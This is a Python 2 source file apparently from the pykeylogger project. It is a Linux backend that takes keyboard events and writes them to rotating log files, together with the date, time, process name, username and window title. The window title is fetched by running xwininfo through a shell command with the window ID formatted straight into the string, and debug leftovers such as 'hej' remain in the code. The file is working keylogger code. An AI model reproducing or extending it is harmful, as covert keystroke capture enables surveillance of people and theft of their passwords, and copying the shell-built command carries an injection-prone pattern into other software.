#pykeylogger.backends
from Queue import Queue, Empty
import time
import subprocess

from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)

import detailedlogwriter

class MyDetailedLogWriterFirstStage(detailedlogwriter.DetailedLogWriterFirstStage):
    """ """

    def spawn_second_stage_thread(self): 
        self.sst_q = Queue(0)
        self.sst = MyDetailedLogWriterSecondStage(self.dir_lock, 
                                                self.sst_q, self.loggername)
                                                
class MyDetailedLogWriterSecondStage(detailedlogwriter.DetailedLogWriterSecondStage):
    #print "HEJ\n"
    window_id = None
    def get_window_name_from_id(self, window_id):
        self.logger.debug("window id is %s" % window_id)
        command = '''xwininfo -id %s ''' % window_id
        p = subprocess.Popen([command], shell=True,stdout=subprocess.PIPE)
        result = p.communicate()[0]
        line = result.split('\n')[1]
        title = line.split('"', 1)[1]
        title = title.rstrip('"')
        return title

    def process_event(self):
        try:
            (process_name, username, event) = self.q.get(timeout=0.05) #need the timeout so that thread terminates properly when exiting
            
            window_id = event.Window
            # only fetch window title if window id has changed:
            if not self.window_id == window_id:
                self.window_id = window_id
                self.window_title = self.get_window_name_from_id(window_id)
                
            eventlisttmp = ['hej',detailedlogwriter.to_unicode(detailedlogwriter.time.strftime('%Y%m%d')), # date
                detailedlogwriter.to_unicode(time.strftime('%H%M')), # time
                detailedlogwriter.to_unicode(process_name).replace(self.field_sep,
                    '[sep_key]'), # process name (full path on windows, just name on linux)
                detailedlogwriter.to_unicode(self.window_id), # window handle
                detailedlogwriter.to_unicode(username).replace(self.field_sep, 
                    '[sep_key]'), # username
                
                detailedlogwriter.to_unicode(self.window_title).replace(self.field_sep, 
                    '[sep_key]')] # window title
                            
            if self.subsettings['General']['Log Key Count'] == True:
                eventlisttmp.append('1')
            eventlisttmp.append(to_unicode(self.parse_event_value(event)))
                
            if (self.eventlist[:6] == eventlisttmp[:6]) and \
                (self.subsettings['General']['Limit Keylog Field Size'] == 0 or \
                (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
                
                #append char to log
                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1]
                # increase stroke count
                if self.subsettings['General']['Log Key Count'] == True:
                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1)
            else:
                self.write_to_logfile()
                self.eventlist = eventlisttmp
        except Empty:
            # check if the minute has rolled over, if so, write it out
            if self.eventlist[:2] != range(2) and \
                self.eventlist[:2] != [detailedlogwriter.to_unicode(time.strftime('%Y%m%d')), 
                detailedlogwriter.to_unicode(time.strftime('%H%M'))]:
                self.write_to_logfile()
                self.eventlist = range(7) # blank it out after writing
            
        except:
            self.logger.debug("some exception was caught in the "
                "logwriter loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating